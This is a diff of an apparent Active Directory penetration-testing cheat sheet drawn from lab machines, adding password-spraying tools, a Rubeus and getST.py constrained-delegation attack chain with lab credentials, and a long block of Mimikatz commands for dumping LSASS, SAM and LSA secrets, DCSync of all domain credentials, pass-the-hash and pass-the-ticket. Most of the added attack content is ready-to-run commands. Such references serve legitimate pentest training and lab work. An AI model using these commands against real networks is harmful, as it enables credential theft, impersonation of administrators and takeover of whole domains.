@@ -11,11 +11,18 @@ keywords: Internals
   - **[Wadcoms - Interactive Cheat Sheet for Active Directory](https://wadcoms.github.io/)**
   - **[Active Directory Enumeration Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)**
 
+-----------------------------------------------------------------------
+
 # Initial Access
 
-## Password Spraying via Sprayhound
+## Password Spraying
 **[Password Spraying via Sprayhound](https://github.com/Hackndo/sprayhound)**
   - Checks badpwdcount attribute only in the domain policy
+
+**Additional Resources**
+  - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
+  - [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
+  - [Spray](https://github.com/Greenwolf/Spray)
 
 ## Rid Brute via SMB
 **[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)**
@@ -68,6 +75,8 @@ Any user in Active Directory can enumerate all DNS records in the Domain or Fore
 Additional Resources:
   - [ADIDNS Dump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
 
+-----------------------------------------------------------------------
+
 # Domain Enumeration
 
 ## Impacket (via Python)
@@ -95,6 +104,8 @@ python3 bloodhound.py -u "support" -p "#00^BlackKnight" -c ALL -d BLACKFIELD.loc
 proxychains bloodhound-python -u "web_svc"  -d 'painters.htb' -dc 'dc.painters.htb' --dns-tcp -c ALL -v -ns 192.168.110.55 [proxychains equivalent]
 ```
 
+-----------------------------------------------------------------------
+
 # Poisoning and Relay
 ## Responder
 **[Responder](https://github.com/lgandx/Responder)**
@@ -111,9 +122,13 @@ hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt
 nxc smb [IP] --gen-relay-list relay.txt
 ```
 
+-----------------------------------------------------------------------
+
 # Domain Privilege Escalation
 ## ASREPRoasting
 **[ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)**
+
+**Targets:** If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted blob and bruteforce it offline.
 
 ## Kerberoasting
 **[Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)**
@@ -154,10 +169,36 @@ Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object 
 ## SYSVOL Group Policy Credential Mining
 **[SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)**
 
+## Constrained Delegation
 **[Constrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)**
+
+```
+Rubeus.exe dump /luci:0x599ac7 /service:CIFS/dc.painters.htb /nowrap /outfile [dump to kirbi files]
+Rubeus.exe asktgt /user:blake /password:Password123! /domain:PAINTERS.HTB /dc:192.168.110.55 [request for TGT using credentials]
+Rubeus.exe ptt /ticket:test.kirbi (import ticket)
+Rubeus.exe tgtdeleg /user:blake /password:Password123! /domain:PAINTERS.HTB /target:CIFS/dc.painters.htb /nowrap (ticket delegation with TGT to obtain TGS of target service)
+Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dc.painters.htb" /user:blake /ticket:test.kirbi /nowrap (Access to CIFS/dc.painters.htb)
+
+
+**For Linux use:**
+base64 -d ticket.kirbi.b64 > ticket.kirbi
+ticketConverter.py cifs.kirbi cifs.ccache
+export KRB5CCNAME=cifs.ccache
+sudo apt-get install krb5-user
+
+OR
+
+getST.py -spn "cifs/dc.painters.htb" -impersonate "administrator" "painters/blake:Password123\!" -dc-ip 192.168.110.55
+```
+
+**What if we have delegation rights for only a spesific SPN? (e.g TIME):**
+
+In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.
 
 **Additional Resources**
   - [Using altservice to generate LDAP TGS](https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13#3276)
+
+-----------------------------------------------------------------------
 
 # Lateral Movement
 
@@ -222,7 +263,7 @@ https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb96
 
 -----------------------------------------------------------------------
 
-## Active Directory Tools
+# Active Directory Tools
 **[NetExec](https://github.com/Pennyw0rth/NetExec)**
 ```
 curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh (install Rust)
@@ -287,32 +328,69 @@ powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.e
 
 **[Pywerview - Linux AD Enumeration](https://github.com/the-useless-one/pywerview)**
 
-```
-Rubeus.exe dump /luci:0x599ac7 /service:CIFS/dc.painters.htb /nowrap /outfile [dump to kirbi files]
-Rubeus.exe asktgt /user:blake /password:Password123! /domain:PAINTERS.HTB /dc:192.168.110.55 [request for TGT using credentials]
-Rubeus.exe ptt /ticket:test.kirbi (import ticket)
-Rubeus.exe tgtdeleg /user:blake /password:Password123! /domain:PAINTERS.HTB /target:CIFS/dc.painters.htb /nowrap (ticket delegation with TGT to obtain TGS of target service)
-Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dc.painters.htb" /user:blake /ticket:test.kirbi /nowrap (Access to CIFS/dc.painters.htb)
-
-
-**For Linux use:**
-base64 -d ticket.kirbi.b64 > ticket.kirbi
-ticketConverter.py cifs.kirbi cifs.ccache
-export KRB5CCNAME=cifs.ccache
-sudo apt-get install krb5-user
-
-OR
-
-getST.py -spn "cifs/dc.painters.htb" -impersonate "administrator" "painters/blake:Password123\!" -dc-ip 192.168.110.55
-```
-
 **[Empire - Post-exploitation Framework](https://github.com/BC-SECURITY/Empire)**
 
 
 **[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)**
 
+```
+#Dump LSASS:
+mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz sekurlsa::logonpasswords
+
+#(Over) Pass The Hash
+mimikatz privilege::debug
+mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
+
+#List all available kerberos tickets in memory
+mimikatz sekurlsa::tickets
+
+#Dump local Terminal Services credentials
+mimikatz sekurlsa::tspkg
+
+#Dump and save LSASS in a file
+mimikatz sekurlsa::minidump c:\temp\lsass.dmp
+
+#List cached MasterKeys
+mimikatz sekurlsa::dpapi
+
+#List local Kerberos AES Keys
+mimikatz sekurlsa::ekeys
+
+#Dump SAM Database
+mimikatz lsadump::sam
+
+#Dump SECRETS Database
+mimikatz lsadump::secrets
+
+#Inject and dump the Domain Controler's Credentials
+mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz lsadump::lsa /inject
+
+#Dump the Domain's Credentials without touching DC's LSASS and also remotely
+mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
+
+#Dump old passwords and NTLM hashes of a user
+mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history
+
+#List and Dump local kerberos credentials
+mimikatz kerberos::list /dump
+
+#Pass The Ticket
+mimikatz kerberos::ptt <PathToKirbiFile>
+
+#List TS/RDP sessions
+mimikatz ts::sessions
+
+#List Vault credentials
+mimikatz vault::list
+```
+
 **Additional Resources**
-  - [Mimikatz Post Exploitation Basics](https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87)**
+  - [Mimikatz Post Exploitation Basics](https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87)
+  - [Mimikatz Guide Reference](https://adsecurity.org/?page_id=1821)
 
 
 **[Wordlists](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat-install)**
